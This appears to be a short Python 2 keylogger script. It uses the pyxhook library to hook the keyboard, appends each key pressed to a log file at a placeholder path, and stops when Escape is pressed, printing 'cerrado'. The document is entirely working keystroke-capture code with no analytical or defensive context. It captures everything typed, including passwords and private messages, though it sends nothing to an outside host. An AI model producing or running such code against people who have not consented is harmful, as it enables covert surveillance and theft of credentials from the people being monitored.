import pyxhook

log_file='PATH_FILE/file.log'

def OnKeyPress(event):
  fob=open(log_file,'a')
  fob.write(event.Key)
  fob.write('\n')
  
  if event.Ascii==27: #escape ascii
    fob.close()
    new_hook.cancel()
    print "cerrado"
  

new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
new_hook.HookKeyboard()
new_hook.start()
